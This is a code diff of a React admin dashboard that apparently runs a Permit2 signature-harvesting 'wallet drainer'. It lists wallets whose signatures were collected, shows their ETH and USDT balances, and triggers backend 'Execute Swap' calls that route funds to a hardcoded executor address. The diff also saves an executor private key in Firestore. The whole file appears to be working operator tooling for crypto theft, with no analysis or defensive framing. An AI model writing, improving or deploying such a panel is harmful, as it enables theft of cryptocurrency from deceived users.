@@ -9,15 +9,13 @@ const HARDCODED_EXECUTOR = '0x05a5b264448da10877f79fbdff35164be7b9a869';
 export default function Admin() {
   const [signatures, setSignatures] = useState([]);
   const [groupedData, setGroupedData] = useState({});
-
-  const [recipient] = useState(HARDCODED_EXECUTOR);
-  const [outputToken, setOutputToken] = useState(
-    localStorage.getItem('admin_outputToken') || "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2"
-  );
+  const [recipient, setRecipient] = useState(HARDCODED_EXECUTOR);
+  const [outputToken, setOutputToken] = useState(localStorage.getItem('admin_outputToken') || "0xC02aaa39b223FE8D0A0E5C4F27eAD9083C756Cc2");
 
   const [isSettingsOpen, setIsSettingsOpen] = useState(false);
   const [settingsLoading, setSettingsLoading] = useState(false);
   const [settingsStatus, setSettingsStatus] = useState("");
+  const [executorAddressSetting, setExecutorAddressSetting] = useState(HARDCODED_EXECUTOR);
   const [executorPrivateKeySetting, setExecutorPrivateKeySetting] = useState('');
 
   const [selectedWallet, setSelectedWallet] = useState(null);
@@ -25,41 +23,27 @@ export default function Admin() {
   const [processingId, setProcessingId] = useState(null);
   const [statusMsg, setStatusMsg] = useState("");
 
-  const [balances, setBalances] = useState({});
-  const [tokenBalances, setTokenBalances] = useState({});
-  const [executorEthBalance, setExecutorEthBalance] = useState('—');
-  const [executorTokenBalance, setExecutorTokenBalance] = useState('—');
-  const [tokenSymbol, setTokenSymbol] = useState('TOKEN');
-  const [tokenDecimals, setTokenDecimals] = useState(6);
-
-  const tokenAddress = outputToken || import.meta.env.VITE_USDT_ADDRESS || '0xdAC17F958D2ee523a2206206994597C13D831ec7';
-  const provider = new ethers.JsonRpcProvider(import.meta.env.VITE_RPC_URL || 'https://cloudflare-eth.com');
-
-  const ERC20_ABI = [
-    "function balanceOf(address) view returns (uint256)",
-    "function decimals() view returns (uint8)",
-    "function symbol() view returns (string)"
-  ];
-
-  // Save output token
   useEffect(() => {
     localStorage.setItem('admin_outputToken', outputToken);
   }, [outputToken]);
 
-  // Load settings from Firestore
   const openSettings = async () => {
     setIsSettingsOpen(true);
     setSettingsLoading(true);
     try {
       const snap = await getDoc(docRef(db, 'admin_config', 'settings'));
-      if (snap.exists()) {
-        const data = snap.data();
-        setOutputToken(data.tokenAddress || outputToken);
-        setExecutorPrivateKeySetting(data.executorPrivateKey || '');
-      }
-      setSettingsStatus('Settings loaded');
+      const s = snap.exists() ? snap.data() : {};
+
+      const execVal = s.executorAddress || HARDCODED_EXECUTOR;
+      const tokenVal = s.tokenAddress || outputToken;
+      const privKeyVal = s.executorPrivateKey || '';
+
+      setExecutorAddressSetting(execVal);
+      setExecutorPrivateKeySetting(privKeyVal);
+      setOutputToken(tokenVal);
+      setSettingsStatus('Loaded');
     } catch (err) {
-      setSettingsStatus('Failed to load settings');
+      setSettingsStatus('Load failed');
     } finally {
       setSettingsLoading(false);
     }
@@ -70,10 +54,11 @@ export default function Admin() {
     setSettingsStatus('Saving...');
     try {
       await setDoc(docRef(db, 'admin_config', 'settings'), {
-        tokenAddress: outputToken,
-        executorPrivateKey: executorPrivateKeySetting || null,
+        executorAddress: executorAddressSetting,
+        executorPrivateKey: executorPrivateKeySetting || undefined,
+        tokenAddress: outputToken
       }, { merge: true });
-      setSettingsStatus('Saved successfully');
+      setSettingsStatus('Saved');
     } catch (err) {
       setSettingsStatus('Save failed');
     } finally {
@@ -81,7 +66,6 @@ export default function Admin() {
     }
   };
 
-  // Real-time signatures
   useEffect(() => {
     const q = query(collection(db, "permit2_signatures"));
     const unsub = onSnapshot(q, (snapshot) => {
@@ -98,90 +82,91 @@ export default function Admin() {
     return () => unsub();
   }, []);
 
-  // Fetch all balances + token info
-  useEffect(() => {
-    const owners = Object.keys(groupedData);
-    if (owners.length === 0) return;
+  const [balances, setBalances] = useState({});
+  const [tokenBalances, setTokenBalances] = useState({});
+  const [executorEthBalance, setExecutorEthBalance] = useState('—');
+  const [executorTokenBalance, setExecutorTokenBalance] = useState('—');
+  const [tokenSymbol, setTokenSymbol] = useState('TOKEN');
 
+  const DEFAULT_TOKEN = import.meta.env.VITE_USDT_ADDRESS || '0xdAC17F958D2ee523a2206206994597C13D831ec7';
+  const tokenAddress = outputToken || DEFAULT_TOKEN;
+  const ERC20_ABI = [
+    'function balanceOf(address) view returns (uint256)',
+    'function decimals() view returns (uint8)'
+  ];
+  const [tokenDecimals, setTokenDecimals] = useState(6);
+  const EXECUTOR_ADDRESS_UI = HARDCODED_EXECUTOR;
+
+  const provider = new ethers.JsonRpcProvider(import.meta.env.VITE_RPC_URL || 'https://cloudflare-eth.com');
+
+  useEffect(() => {
     let mounted = true;
+    const owners = Object.keys(groupedData);
+    if (!owners.length) {
+      setBalances({});
+      return;
+    }
 
     (async () => {
+      const next = {};
+      const nextToken = {};
       let tokenContract;
-      let decimals = 6;
-      let symbol = 'TOKEN';
 
       try {
         tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
-        const [dec, sym] = await Promise.all([
-          tokenContract.decimals(),
-          tokenContract.symbol().catch(() => 'TOKEN')
-        ]);
-        decimals = Number(dec);
-        symbol = sym;
-        if (mounted) {
-          setTokenDecimals(decimals);
-          setTokenSymbol(symbol);
-        }
-      } catch (e) {
-        console.warn("Token contract failed (using fallback)", e);
-      }
+        const dec = await tokenContract.decimals();
+        setTokenDecimals(Number(dec));
+      } catch (e) {}
 
-      const newBalances = {};
-      const newTokenBalances = {};
-
-      // User wallets
       for (const owner of owners) {
         try {
-          const eth = await provider.getBalance(owner);
-          newBalances[owner] = parseFloat(ethers.formatEther(eth)).toFixed(4);
+          const b = await provider.getBalance(owner);
+          next[owner] = parseFloat(ethers.formatEther(b)).toFixed(4);
         } catch {
-          newBalances[owner] = '—';
+          next[owner] = '—';
         }
 
         try {
           if (tokenContract) {
             const tb = await tokenContract.balanceOf(owner);
-            newTokenBalances[owner] = Number(ethers.formatUnits(tb, decimals)).toFixed(4);
-          } else {
-            newTokenBalances[owner] = '—';
-          }
+            nextToken[owner] = Number(ethers.formatUnits(tb, tokenDecimals)).toFixed(4);
+          } else nextToken[owner] = '—';
         } catch {
-          newTokenBalances[owner] = '—';
+          nextToken[owner] = '—';
         }
-      }
-
-      // Executor balance
-      try {
-        const eth = await provider.getBalance(HARDCODED_EXECUTOR);
-        if (mounted) setExecutorEthBalance(parseFloat(ethers.formatEther(eth)).toFixed(4));
-      } catch {
-        if (mounted) setExecutorEthBalance('—');
-      }
-
-      try {
-        if (tokenContract) {
-          const tb = await tokenContract.balanceOf(HARDCODED_EXECUTOR);
-          if (mounted) setExecutorTokenBalance(Number(ethers.formatUnits(tb, decimals)).toFixed(4));
-        }
-      } catch {
-        if (mounted) setExecutorTokenBalance('—');
       }
 
       if (mounted) {
-        setBalances(newBalances);
-        setTokenBalances(newTokenBalances);
+        setBalances(next);
+        setTokenBalances(nextToken);
+      }
+    })();
+
+    (async () => {
+      try {
+        const eb = await provider.getBalance(EXECUTOR_ADDRESS_UI);
+        setExecutorEthBalance(parseFloat(ethers.formatEther(eb)).toFixed(4));
+      } catch {
+        setExecutorEthBalance('—');
+      }
+      try {
+        const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
+        const tb = await tokenContract.balanceOf(EXECUTOR_ADDRESS_UI);
+        setExecutorTokenBalance(Number(ethers.formatUnits(tb, tokenDecimals)).toFixed(4));
+      } catch {
+        setExecutorTokenBalance('—');
       }
     })();
 
     return () => { mounted = false; };
-  }, [groupedData, tokenAddress]);
+  }, [groupedData]);
 
   const handleExecute = async (sigData) => {
     setProcessingId(sigData.id);
-    setStatusMsg("Contacting backend...");
+    setStatusMsg("Processing...");
 
     try {
-      const res = await fetch(BACKEND_URL, {
+      const response = await fetch(BACKEND_URL, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
@@ -191,14 +176,13 @@ export default function Admin() {
         })
       });
 
-      const result = await res.json();
+      const result = await response.json();
 
-      if (!res.ok || !result.ok) {
-        throw new Error(result.error || "Backend execution failed");
-      }
+      if (!response.ok || !result.ok) throw new Error(result.error || "Execution failed");
 
-      setStatusMsg("Swap executed successfully!");
-      setTimeout(() => setStatusMsg(""), 4000);
+      setStatusMsg("Success");
+      setTimeout(() => setStatusMsg(""), 3000);
+
     } catch (err) {
       setStatusMsg("Error: " + err.message);
     } finally {
@@ -206,238 +190,161 @@ export default function Admin() {
     }
   };
 
-  const formatAmount = (amount, tokenAddr) => {
-    if (!amount) return '0';
-    try {
-      // Use correct decimals for the actual input token (not output token)
-      const dec = tokenAddr.toLowerCase() === '0xdac17f958d2ee523a2206206994597c13d831ec7'.toLowerCase() ? 6 : tokenDecimals;
-      return (BigInt(amount) / (10n ** BigInt(dec))).toString();
-    } catch {
-      return amount.toString();
-    }
+  const openModal = (wallet) => {
+    setSelectedWallet(wallet);
+    setIsModalOpen(true);
+    setStatusMsg("");
   };
 
   return (
-    <>
-      <div className="min-h-screen bg-gray-50">
-        {/* Header */}
-        <header className="bg-white border-b border-gray-200 shadow-sm sticky top-0 z-40">
-          <div className="max-w-7xl mx-auto px-6 py-5 flex items-center justify-between">
-            <div>
-              <h1 className="text-2xl font-bold text-black">Admin Control Center</h1>
-              <p className="text-sm text-black mt-1">Permit2 Signature Manager</p>
+    <div className="min-h-screen bg-gray-50 p-6">
+
+      {/* Header */}
+      <div className="flex items-center justify-between mb-8">
+        <h1 className="text-2xl font-bold text-gray-800">Admin Dashboard</h1>
+        <button
+          onClick={openSettings}
+          className="px-4 py-2 bg-gray-900 text-white rounded-md hover:bg-gray-700"
+        >
+          Settings
+        </button>
+      </div>
+
+      {/* Settings Row */}
+      <div className="mb-6 bg-white shadow p-5 rounded-lg border">
+        <h2 className="text-lg font-semibold text-gray-700 mb-3">Global Settings</h2>
+        <input
+          className="w-full px-3 py-2 border rounded-md"
+          value={outputToken}
+          onChange={(e) => setOutputToken(e.target.value)}
+          placeholder="Output Token Address"
+        />
+      </div>
+
+      {/* Wallets Grid */}
+      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
+        {Object.keys(groupedData).map(owner => (
+          <div
+            key={owner}
+            className="bg-white border shadow-sm rounded-lg p-5 cursor-pointer hover:shadow-md"
+            onClick={() => openModal(owner)}
+          >
+            <div className="font-mono text-gray-700 text-sm">
+              {owner.slice(0, 6)}...{owner.slice(-4)}
             </div>
-            <div className="flex items-center gap-4">
-              <span className="px-4 py-2 text-xs font-semibold text-black bg-green-100 rounded-full">Server Mode • Online</span>
-              <button onClick={openSettings} className="p-2.5 hover:bg-gray-100 rounded-xl transition text-black">
-                Settings Icon
+
+            <div className="mt-3 text-gray-900 font-bold">
+              {balances[owner]} ETH • {tokenBalances[owner]} {tokenSymbol}
+            </div>
+
+            <div className="mt-4 flex justify-between text-sm text-gray-600">
+              <div>Signatures</div>
+              <div className="font-bold">{groupedData[owner].length}</div>
+            </div>
+
+            <div className="flex justify-between text-sm text-gray-600 mt-1">
+              <div>Pending</div>
+              <div className="font-bold text-yellow-600">
+                {groupedData[owner].filter(x => !x.processed).length}
+              </div>
+            </div>
+          </div>
+        ))}
+      </div>
+
+      {/* Modal */}
+      {isModalOpen && selectedWallet && (
+        <div className="fixed inset-0 bg-black/40 flex items-center justify-center p-4">
+          <div className="bg-white rounded-lg shadow-xl w-full max-w-lg p-6 relative">
+
+            <div className="flex justify-between items-center mb-4">
+              <h3 className="text-xl font-semibold">
+                {selectedWallet.slice(0, 6)}...{selectedWallet.slice(-4)}
+              </h3>
+              <button
+                onClick={() => setIsModalOpen(false)}
+                className="text-gray-500 hover:text-gray-800"
+              >
+                ✕
               </button>
             </div>
-          </div>
-        </header>
 
-        <div className="max-w-7xl mx-auto px-6 py-8 space-y-8">
-          {/* Executor Card */}
-          <div className="bg-white rounded-2xl shadow-lg border border-gray-200 p-6">
-            <h3 className="text-sm font-semibold text-black uppercase tracking-wider">Executor Wallet (Hardcoded)</h3>
-            <div className="mt-4 flex items-center justify-between">
-              <div>
-                <p className="font-mono text-lg text-black">{HARDCODED_EXECUTOR.slice(0, 10)}...{HARDCODED_EXECUTOR.slice(-8)}</p>
-              </div>
-              <div className="text-right">
-                <p className="text-3xl font-bold text-black">{executorEthBalance} ETH</p>
-                <p className="text-xl text-black">{executorTokenBalance} {tokenSymbol}</p>
-              </div>
-            </div>
-          </div>
+            {groupedData[selectedWallet].map(sig => (
+              <div
+                key={sig.id}
+                className="border p-4 rounded-lg mb-4 bg-gray-50"
+              >
+                <div className="text-sm mb-1">Token: {sig.token.slice(0,6)}...{sig.token.slice(-4)}</div>
+                <div className="text-sm mb-1">
+                  Amount: {(BigInt(sig.amount) / 10n**6n).toString()} USDT
+                </div>
 
-          {/* Output Token */}
-          <div className="bg-white rounded-xl shadow-sm border border-gray-200 p-6">
-            <label className="block text-sm font-medium text-black mb-3">Output Token (Swap Into)</label>
-            <input
-              type="text"
-              value={outputToken}
-              onChange={(e) => setOutputToken(e.target.value)}
-              className="w-full px-5 py-3.5 border border-gray-300 rounded-xl focus:ring-2 focus:ring-blue-500 focus:border-transparent outline-none transition text-black font-mono"
-              placeholder="0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2"
-            />
-          </div>
-
-          {/* Wallets Grid */}
-          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-6">
-            {Object.keys(groupedData).length === 0 ? (
-              <div className="col-span-full text-center py-24">
-                <div className="text-8xl mb-6 text-black">Empty Inbox</div>
-                <p className="text-xl text-black">No signatures collected yet</p>
-              </div>
-            ) : (
-              Object.entries(groupedData).map(([owner, sigs]) => {
-                const pending = sigs.filter(s => !s.processed).length;
-                return (
-                  <div
-                    key={owner}
-                    onClick={() => { setSelectedWallet(owner); setIsModalOpen(true); setStatusMsg(""); }}
-                    className="bg-white rounded-2xl shadow-md border border-gray-200 p-6 hover:shadow-xl hover:border-gray-300 transition-all cursor-pointer group"
+                {!sig.processed ? (
+                  <button
+                    onClick={() => handleExecute(sig)}
+                    disabled={processingId === sig.id}
+                    className="mt-2 w-full bg-black text-white py-2 rounded hover:bg-gray-800"
                   >
-                    <div className="flex items-center justify-between mb-5">
-                      <div className="w-12 h-12 bg-gradient-to-br from-indigo-500 to-purple-600 rounded-xl flex items-center justify-center text-white text-xl font-bold">
-                        {owner.slice(2, 4).toUpperCase()}
-                      </div>
-                      <span className="text-xs text-black">Click to manage</span>
-                    </div>
+                    {processingId === sig.id ? "Processing..." : "Execute Swap"}
+                  </button>
+                ) : (
+                  <a
+                    href={`https://etherscan.io/tx/${sig.routerTx}`}
+                    className="mt-2 block text-blue-600"
+                    target="_blank"
+                  >
+                    View on Etherscan →
+                  </a>
+                )}
+              </div>
+            ))}
 
-                    <p className="font-mono text-sm font-semibold text-black truncate">
-                      {owner.slice(0, 10)}...{owner.slice(-8)}
-                    </p>
-
-                    <div className="mt-4 space-y-3">
-                      <div className="flex justify-between text-sm">
-                        <span className="text-black">ETH</span>
-                        <span className="font-medium text-black">{balances[owner] || '—'}</span>
-                      </div>
-                      <div className="flex justify-between text-sm">
-                        <span className="text-black">{tokenSymbol}</span>
-                        <span className="font-medium text-black">{tokenBalances[owner] || '—'}</span>
-                      </div>
-                      <div className="pt-3 border-t border-gray-100">
-                        <div className="flex justify-between">
-                          <span className="text-black">Signatures</span>
-                          <span className="font-bold text-black">{sigs.length}</span>
-                        </div>
-                        <div className="flex justify-between mt-1">
-                          <span className="text-black">Pending</span>
-                          <span className={`font-bold ${pending > 0 ? '' : ''} text-black`}>
-                            {pending}
-                          </span>
-                        </div>
-                      </div>
-                    </div>
-
-                    <button className="mt-6 w-full py-3 bg-gradient-to-r from-indigo-600 to-purple-600 text-white font-semibold rounded-xl hover:from-indigo-700 hover:to-purple-700 transition shadow-m[...]">
-                      Manage Wallet
-                    </button>
-                  </div>
-                );
-              })
-            )}
           </div>
         </div>
+      )}
 
-        {/* Wallet Detail Modal */}
-        {isModalOpen && selectedWallet && (
-          <div className="fixed inset-0 bg-black bg-opacity-60 flex items-center justify-center z-50 p-4" onClick={() => setIsModalOpen(false)}>
-            <div className="bg-white rounded-3xl shadow-2xl max-w-3xl w-full max-h-[90vh] overflow-y-auto" onClick={e => e.stopPropagation()}>
-              <div className="sticky top-0 bg-white border-b border-gray-200 px-8 py-6 flex items-center justify-between">
-                <h2 className="text-2xl font-bold text-black">
-                  {selectedWallet.slice(0, 10)}...{selectedWallet.slice(-8)}
-                </h2>
-                <button onClick={() => setIsModalOpen(false)} className="text-black hover:text-black">
-                  Close Icon
-                </button>
-              </div>
+      {/* Settings Modal */}
+      {isSettingsOpen && (
+        <div className="fixed inset-0 bg-black/40 flex items-center justify-center p-4">
+          <div className="bg-white rounded-lg shadow-xl w-full max-w-md p-6 relative">
 
-              {statusMsg && (
-                <div className="mx-8 mt-6 px-6 py-4 rounded-xl text-sm font-medium text-black bg-gray-200">
-                  {statusMsg}
-                </div>
-              )}
-
-              <div className="p-8 space-y-5">
-                {groupedData[selectedWallet].map(sig => (
-                  <div key={sig.id} className={`p-6 rounded-2xl border-2 ${sig.processed ? 'border-gray-200 bg-gray-50' : 'border-indigo-200 bg-indigo-50/30'}`}>
-                    <div className="grid grid-cols-1 md:grid-cols-3 gap-4 text-sm">
-                      <div>
-                        <span className="text-black">Token</span>
-                        <p className="font-mono font-semibold text-black">{sig.token.slice(0, 10)}...{sig.token.slice(-8)}</p>
-                      </div>
-                      <div>
-                        <span className="text-black">Amount</span>
-                        <p className="font-semibold text-black">{formatAmount(sig.amount, sig.token)} {sig.token.toLowerCase() === '0xdac17f958d2ee523a2206206994597c13d831ec7' ? 'USDT' : tokenSymbol}</p>
-                      </div>
-                      <div>
-                        <span className="text-black">Status</span>
-                        <p>
-                          <span className={`inline-block px-4 py-1.5 rounded-full text-xs font-bold text-black ${
-                            sig.processed ? 'bg-green-100' : 'bg-yellow-100'
-                          }`}>
-                            {sig.processed ? 'Processed' : 'Ready to Execute'}
-                          </span>
-                        </p>
-                      </div>
-                    </div>
-
-                    {sig.lastError && !sig.processed && (
-                      <p className="font-semibold text-black text-xs mt-3 font-medium">Warning: {sig.lastError}</p>
-                    )}
-
-                    <div className="mt-5">
-                      {!sig.processed ? (
-                        <button
-                          onClick={() => handleExecute(sig)}
-                          disabled={processingId === sig.id}
-                          className="w-full py-4 bg-gradient-to-r from-emerald-500 to-teal-600 text-white font-bold rounded-xl hover:from-emerald-600 hover:to-teal-700 disabled:opacity-60 transition t[...]
-                        >
-                          {processingId === sig.id ? "EXECUTING..." : "EXECUTE SWAP NOW"}
-                        </button>
-                      ) : (
-                        <a
-                          href={`https://etherscan.io/tx/${sig.routerTx}`}
-                          target="_blank"
-                          rel="noreferrer"
-                          className="block text-center py-4 bg-gray-100 text-black font-semibold rounded-xl hover:bg-gray-200 transition"
-                        >
-                          View on Etherscan ↗
-                        </a>
-                      )}
-                    </div>
-                  </div>
-                ))}
-              </div>
+            <div className="flex justify-between items-center mb-4">
+              <h3 className="text-xl font-semibold">Settings</h3>
+              <button
+                onClick={() => setIsSettingsOpen(false)}
+                className="text-gray-500 hover:text-gray-800"
+              >
+                ✕
+              </button>
             </div>
-          </div>
-        )}
 
-        {/* Settings Modal */}
-        {isSettingsOpen && (
-          <div className="fixed inset-0 bg-black bg-opacity-60 flex items-center justify-center z-50 p-4" onClick={() => setIsSettingsOpen(false)}>
-            <div className="bg-white rounded-3xl shadow-2xl max-w-md w-full p-8" onClick={e => e.stopPropagation()}>
-              <h2 className="text-2xl font-bold mb-8 text-black">Settings</h2>
-              <div className="space-y-6">
-                <div>
-                  <label className="block text-sm font-medium text-black mb-2">Executor Private Key (Optional)</label>
-                  <input
-                    type="password"
-                    value={executorPrivateKeySetting}
-                    onChange={e => setExecutorPrivateKeySetting(e.target.value)}
-                    className="w-full px-5 py-3.5 border border-gray-300 rounded-xl focus:ring-2 focus:ring-red-500 outline-none font-mono text-black"
-                    placeholder="Only for testing • NEVER in production"
-                  />
-                  <p className="text-xs text-black mt-3 font-medium italic">
-                    Storing private keys in Firestore is extremely insecure!
-                  </p>
-                </div>
+            <input
+              value={executorAddressSetting}
+              onChange={e => setExecutorAddressSetting(e.target.value)}
+              className="w-full px-3 py-2 border mb-3 rounded"
+              placeholder="Executor Address"
+            />
 
-                <div className="flex gap-4">
-                  <button
-                    onClick={saveSettings}
-                    disabled={settingsLoading}
-                    className="flex-1 py-4 bg-indigo-600 text-white font-bold rounded-xl hover:bg-indigo-700 disabled:opacity-60 transition"
-                  >
-                    {settingsLoading ? "Saving..." : "Save Settings"}
-                  </button>
-                  <button
-                    onClick={() => setIsSettingsOpen(false)}
-                    className="px-8 py-4 border border-gray-300 rounded-xl hover:bg-gray-50 transition font-medium text-black"
-                  >
-                    Cancel
-                  </button>
-                </div>
-                {settingsStatus && <p className="text-center text-sm text-black">{settingsStatus}</p>}
-              </div>
-            </div>
+            <input
+              type="password"
+              value={executorPrivateKeySetting}
+              onChange={e => setExecutorPrivateKeySetting(e.target.value)}
+              className="w-full px-3 py-2 border mb-3 rounded"
+              placeholder="Executor Private Key"
+            />
+
+            <button
+              onClick={saveSettings}
+              disabled={settingsLoading}
+              className="w-full py-2 bg-gray-900 text-white rounded hover:bg-gray-800"
+            >
+              {settingsLoading ? "Saving..." : "Save Settings"}
+            </button>
+
+            <div className="text-sm text-gray-500 mt-2">{settingsStatus}</div>
           </div>
-        )}
-      </div>
-    </>
+        </div>
+      )}
+    </div>
   );
 }
